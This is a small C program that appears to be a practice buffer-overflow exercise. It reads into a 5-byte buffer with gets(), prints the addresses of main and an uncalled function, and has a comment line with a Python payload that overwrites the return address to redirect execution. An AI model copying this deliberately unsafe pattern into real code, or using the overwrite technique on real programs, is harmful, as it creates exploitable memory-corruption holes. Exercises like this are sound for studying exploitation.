#include <stdio.h>

void other() {
	printf("U broken prog");
	fflush(stdout);
}

void input() {
	char buffer[5];
	printf("%x%x\n", *((int*)(buffer + 9)), *((int*)(buffer + 13)));
	gets(buffer);
	printf("%x%x\n", *((int*)(buffer + 9)), *((int*)(buffer + 13)));
	puts(buffer);
	fflush(stdout);
}

int main()
{
	printf("%p\n", &main);
	printf("%p\n", &other);
	input();
	printf("Normal out");

	return 0;
}
//python3 -c "print('a'*13 + '\x7d\x12\x40\x00')" | ./main.out
//./main.out < input.txt
//0x55555555475a